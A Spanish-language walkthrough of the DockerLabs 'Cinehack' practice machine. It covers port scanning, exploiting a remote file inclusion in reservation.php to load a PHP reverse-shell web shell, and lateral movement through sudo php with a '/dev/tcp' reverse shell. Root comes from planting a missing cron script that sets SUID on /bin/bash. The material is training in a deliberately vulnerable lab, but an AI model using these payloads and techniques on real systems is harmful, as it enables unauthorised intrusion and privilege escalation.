---
title: Cinehack
description: DockerLabs es una plataforma gratuita diseñada para practicar hacking ético al alcance de todo el mundo utilizando Docker. DockerLabs ofrece un entorno seguro y accesible para desplegar laboratorios vulnerables de la forma más eficiente y sencilla posible.
date: 2025-01-28
toc: true
pin: false
image:
 path: /assets/img/dockerlabs-writeup-cinehack/cinehack_logo.png
categories:
  - Docker_Labs
tags:
  - linux
  - dockerlabs
  - tcp
  - http
  - fuzzing_web
  - password_attacks
  - rfi
  - interactive_tty
  - sudo_abuse
  - cron_abuse
  - information_gathering
  - web_analysis
  - foothold
  - lateral_movement
  - privilege_escalation

---
## Information Gathering

El análisis inicial comienza con el comando ping para confirmar la accesibilidad de la máquina objetivo en la red.

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ ping -c 1 127.17.0.2
PING 127.17.0.2 (127.17.0.2) 56(84) bytes of data.
64 bytes from 127.17.0.2: icmp_seq=1 ttl=64 time=0.044 ms

--- 127.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms
```

Realizo un escaneo agresivo de puertos con nmap, lo que me permite identificar rápidamente todos los puertos abiertos.

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ sudo nmap -p- --open -sS --min-rate 5000 -vvv 127.17.0.3 -n -Pn -oG nmap1
Host: 127.17.0.2 ()     Status: Up
Host: 127.17.0.2 ()     Ports: 80/open/tcp//http///     Ignored State: closed (65534)
```

Profundizo en los puertos detectados, recopilando información detallada sobre los servicios y versiones en ejecución.

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ sudo nmap -sCV -p80 -vvv 127.17.0.2 -oN nmap2
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Bienvenido a Cinema DL
|_http-server-header: Apache/2.4.58 (Ubuntu)
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
```
```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ whatweb 127.17.0.2
http://127.17.0.2 [200 OK] Apache[2.4.58], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.58 (Ubuntu)], IP[127.17.0.2], Title[Bienvenido a Cinema DL]
```

---
## Web Analysis

El sitio web es estático y tiene un contenido mínimo.

![](assets/img/dockerlabs-writeup-cinehack/cinehack1_1.png)

Lo único destacable es el título "Bienvenido a Cinema DL". La extensión `.dl` se utiliza en esta plataforma para nombrar dominios locales propios de DockerLabs. Dado que `.dl` es un dominio interno, agregué una entrada en `/etc/hosts` para acceder a la web correctamente.

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ echo '127.17.0.2\tcinema.dl' | sudo tee -a /etc/hosts
```

Ahora el contenido del sitio cambia, mostrando más información. Aparecen cinco películas disponibles para reservar.

![](assets/img/dockerlabs-writeup-cinehack/cinehack1_2.png)

Sin embargo, solo puedo acceder a la película "El tiempo que tenemos", donde se encuentra un formulario para realizar una reserva seleccionando un asiento.

![](assets/img/dockerlabs-writeup-cinehack/cinehack1_3.png)

Los datos del formulario parecen enviarse atraves de `reservation.php`, lo que es un punto de interés.

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ dirb http://cinema.dl/ -X .html,.conf,.txt,.php,.md -w
---- Scanning URL: http://cinema.dl/ ----
+ http://cinema.dl/index.html (CODE:200|SIZE:7502)
+ http://cinema.dl/reservation.php (CODE:200|SIZE:1779)
```

![](assets/img/dockerlabs-writeup-cinehack/cinehack1_4.png)


---
## Foothold

Al interceptar la petición POST del formulario, observo que los datos se envían de la siguiente manera:

```http
POST /reservation.php HTTP/1.1
Host: cinema.dl
name=Juan+P%C3%A9rez&email=juanperez%40example.com&phone=%2B34+600+123+456&problem_url=http%3A%2Ftusitio.com%2Fuploads%2Fwebshell.php
```

![](assets/img/dockerlabs-writeup-cinehack/cinehack1_5.png)

La vulnerabilidad se encuentra en el parámetro `problem_url`, el cual parece permitir la carga de archivos remotos. Para explotar esta falla y subir un archivo malicioso, es necesario modificar la solicitud y agregar el parámetro en la URL en lugar del cuerpo.

```http
POST /reservation.php?problem_url=http%3a//xx.xx.xx.xx%3axx/shell.php` HTTP/1.1
```

Utilicé el siguiente script como web shell:

```php
<?php
$sock=fsockopen("192.168.0.171",4321);
$proc=proc_open("sh", array(0=>$sock, 1 => $sock, 2 => $sock), $pipes);
?>
```

Levanté un servidor HTTP para alojar la shell.

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ python3 -m http.server
```

Y envié la solicitud para cargar la shell en el sistema objetivo.

```http
POST /reservation.php?problem_url=http%3a//192.168.0.171%3a8000/shell.php HTTP/1.1
```

![](assets/img/dockerlabs-writeup-cinehack/cinehack1_6.png)

Para encontrar la ubicación del archivo subido, realicé un escaneo exhaustivo de la máquina sin éxito. Solo logré identificar la ruta correcta tras generar una lista de nombres basada en los actores de las películas en cartelera.

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ echo 'cateblanchett\nblanchettcate\ncate\nblanchett\nkevinhart\nhartkevin\nkevin\nhart\njackblack\nblackjack\njack\nblack\narianagreenblatt\ngreenblattariana\nariana\ngreenblatt\nflorianmounteanu\nmounteanuflorian\nflorian\nmounteanu\njaimeleecurtis\ncurtisjaimelee\njaime\ncurtis\nfedealvarez\nalvarezfede\nfede\nalvarez\nridleyscott\nscottridley\nridley\nscott\nandrewgarfield\ngarfieldandrew\nandrew\ngarfield\nflorencepugh\npughflorence\nflorence\npugh\nanalopez\nlopezana\nana\nlopez\ncarlosmartinez\nmartinezcarlos\ncarlos\nmartinez' > users.txt
```

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ wfuzz -u http://cinema.dl/FUZZ/ -w users.txt --hc=404 -c -t 200
```

![](assets/img/dockerlabs-writeup-cinehack/cinehack1_7.png)

A través de este método, descubrí que el archivo fue almacenado en el directorio andrewgarfield. Procedí a ejecutar la shell para obtener acceso al sistema.

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ nc -nvlp 4321
	listening on [any] 4321 ...
```

![](assets/img/dockerlabs-writeup-cinehack/cinehack1_8.png)

```terminal
	... connect to [192.168.0.171] from (UNKNOWN) [192.168.0.171] 34910

script /dev/null -c bash

www-data@kali:/var/www/cinema.dl/andrewgarfield$ ^Z

/home/kali/Documents/dockerlabs/cinehack:-$ stty raw -echo;fg
[1]  + continued  nc -nvlp 4321
                               reset

Terminal type? xterm

www-data@kali:/var/www/cinema.dl/andrewgarfield$ export TERM=xterm
www-data@kali:/var/www/cinema.dl/andrewgarfield$ export SHELL=bash
www-data@kali:/var/www/cinema.dl/andrewgarfield$ stty rows 42 columns 172
```

```terminal
www-data@kali:/var/www/cinema.dl/andrewgarfield$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---
## Lateral Movement

```terminal
www-data@kali:/$ cat /etc/passwd | grep bash$
root:x:0:0:root:/root:/bin/bash
boss:x:1001:1001:boss,,,:/home/boss:/bin/bash
```

`www-data` puede ejecutar `php` como el usuario `boss` sin necesidad de contraseña.

```terminal
www-data@kali:/$ sudo -l
Matching Defaults entries for www-data on kali:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User www-data may run the following commands on kali:
    (boss) NOPASSWD: /bin/php
```

<https://gtfobins.github.io/gtfobins/php/#sudo>

Creó un script para obtener una conexión reversa al usuario `boss`.

```terminal
www-data@kali:/$ echo 'bash -i >& /dev/tcp/192.168.0.171/4322 0>&1' > /tmp/shell.sh

www-data@kali:/$ chmod +x /tmp/shell.sh
```

```terminal
/home/kali/Documents/dockerlabs/cinehack:-$ nc -nvlp 4322
	listening on [any] 4322 ...
```

De esta forma, ejecuto el script con `php` y obtengo acceso al usuario `boss`.

```terminal
www-data@kali:/$ sudo -u boss /bin/php -r "system('bash /tmp/shell.sh');"

	... connect to [192.168.0.171] from (UNKNOWN) [192.168.0.171] 48490


boss@kali:/var/www/cinema.dl/andrewgarfield$ id
uid=1001(boss) gid=1001(boss) groups=1001(boss),100(users)
```

---
## Privilege Escalation

Después de un tiempo, la sesión como `boss` se cerró automáticamente. Investigando la causa, encontré un script en `/opt/update.sh` que terminaba los procesos de este usuario.

![](assets/img/dockerlabs-writeup-cinehack/cinehack2_1.png)

Además, encontré que en `/var/spool/cron/crontabs/root.sh` había una tarea cron que ejecutaba periódicamente dos scripts, `/opt/update.sh` y `/tmp/script.sh`.

![](assets/img/dockerlabs-writeup-cinehack/cinehack3_1.png)

El script `/tmp/script.sh` se ejecuta con privilegios de `root` y no existe en el sistema, lo que me permite crearlo con contenido malicioso. Para aprovechar esto, lo configuro para establecer el bit SUID en `/bin/bash`, lo que permitirá ejecutar Bash con privilegios elevados.

```terminal
www-data@kali:/var/www/cinema.dl/andrewgarfield$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

```terminal
www-data@kali:/var/www/cinema.dl/andrewgarfield$ echo 'chmod u+s /bin/bash' > /tmp/script.sh
www-data@kali:/var/www/cinema.dl/andrewgarfield$ chmod u+x /tmp/script.sh
```

Monitoreo los permisos de `/bin/bash` hasta que el bit SUID se activa.

```terminal
www-data@kali:/var/www/cinema.dl/andrewgarfield$ watch -d ls -al /bin/bash
-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Finalmente, ejecuto Bash en modo privilegiado para obtener acceso como `root`.

```terminal
www-data@kali:/var/www/cinema.dl/andrewgarfield$ bash -p

bash-5.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```
